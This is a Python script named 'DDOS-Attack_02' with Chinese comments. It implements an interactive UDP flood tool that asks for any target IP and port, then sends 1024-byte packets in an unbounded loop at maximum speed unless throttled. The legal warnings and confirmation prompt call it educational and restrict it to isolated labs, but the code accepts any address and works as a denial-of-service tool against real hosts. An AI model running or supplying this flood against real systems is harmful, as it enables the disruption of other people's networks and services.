#!/usr/bin/env python3
"""
DDOS-Attack_02 - UDP 数据包发送演示 (升级版)
版本: 2.0
原始文件: DDOS-Attack_02.py

功能: 向指定 IP 和端口发送 UDP 数据包，用于理解网络压力测试原理。
警告: 仅限在完全隔离、拥有授权的实验环境中使用。
未经授权攻击他人网络是严重的犯罪行为。
"""

import sys
import os
import time
import socket
import ipaddress

class DDoSSimulator:
    """UDP 数据包发送模拟器"""
    
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.max_packets = 0
        self.rate_limit = 0.0       # 每秒发包间隔(秒)，0表示无限制
        self.sock = None
        self.payload = b'\x00' * 1024  # 默认1024字节载荷

    def show_banner(self):
        """显示警告和法律声明"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("=" * 60)
        print("  DDOS-Attack Educational UDP Packet Sender v2.0")
        print("=" * 60)
        print("LEGAL WARNING:")
        print("This tool is for EDUCATIONAL USE ONLY.")
        print("You must only use it on devices you OWN and")
        print("in a completely ISOLATED lab environment.")
        print("Unauthorized attacks are CRIMINAL OFFENSES.")
        print("=" * 60)
        input("Press Enter to continue or Ctrl+C to abort...")

    def get_target_info(self):
        """获取并验证目标 IP 和端口"""
        while True:
            try:
                ip_str = input("Enter target IP address: ").strip()
                ipaddress.ip_address(ip_str)
                self.target_ip = ip_str
                break
            except ValueError:
                print("[!] Invalid IP address. Please enter a valid IPv4 or IPv6 address.")

        while True:
            try:
                port_str = input("Enter target port (1-65535): ").strip()
                port = int(port_str)
                if 1 <= port <= 65535:
                    self.target_port = port
                    break
                else:
                    print("[!] Port must be between 1 and 65535.")
            except ValueError:
                print("[!] Invalid port number. Please enter a number.")

        while True:
            try:
                pkt_str = input("Enter number of packets to send (0 = infinite): ").strip()
                self.max_packets = int(pkt_str)
                if self.max_packets < 0:
                    print("[!] Number of packets cannot be negative.")
                    continue
                break
            except ValueError:
                print("[!] Invalid number. Please enter a whole number.")

        # 可选速率限制
        try:
            rate_str = input("Enter packet interval in seconds (0 = as fast as possible, e.g. 0.1): ").strip()
            self.rate_limit = float(rate_str)
        except ValueError:
            self.rate_limit = 0.0

    def target_reachable(self):
        """简单 TCP 连通性检查（目标是否可达且端口可能开放）"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def send_packets(self):
        """开始发送 UDP 数据包"""
        print(f"\n[*] Target: {self.target_ip}:{self.target_port}")
        print(f"[*] Packets to send: {'infinite' if self.max_packets == 0 else self.max_packets}")
        print(f"[*] Rate limit: {self.rate_limit if self.rate_limit > 0 else 'None (max speed)'}")
        print("[*] Press Ctrl+C to stop.\n")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0
        start_time = time.time()

        try:
            while self.max_packets == 0 or sent < self.max_packets:
                self.sock.sendto(self.payload, (self.target_ip, self.target_port))
                sent += 1

                # 实时输出，使用 \r 动态更新同一行
                elapsed = time.time() - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                print(f"Sent: {sent} packets | Elapsed: {elapsed:.1f}s | Rate: {pps:.1f} pps   ", end='\r')

                # 速率限制
                if self.rate_limit > 0:
                    time.sleep(self.rate_limit)

        except KeyboardInterrupt:
            print(f"\n\n[!] Sending stopped by user.")
        except Exception as e:
            print(f"\n[!] Error: {e}")
        finally:
            self.sock.close()
            elapsed = time.time() - start_time
            print(f"\n[+] Total packets sent: {sent} in {elapsed:.2f} seconds.")

    def run(self):
        """主流程"""
        self.show_banner()
        self.get_target_info()

        # 安全提醒重复
        print("\n[!] FINAL WARNING: You are about to send UDP traffic to the target.")
        confirm = input("Are you sure this is YOUR OWN device in an isolated environment? (yes/no): ").strip().lower()
        if confirm != 'yes':
            print("[*] Aborted by user.")
            sys.exit(0)

        print("\n[*] Checking target reachability...")
        if not self.target_reachable():
            print("[!] Target appears unreachable or port is not open. Attack may still be attempted?")
            choice = input("Continue anyway? (y/n): ").strip().lower()
            if choice != 'y':
                sys.exit(0)

        self.send_packets()


if __name__ == "__main__":
    try:
        simulator = DDoSSimulator()
        simulator.run()
    except KeyboardInterrupt:
        print("\n[*] Program terminated by user.")
        sys.exit(0)
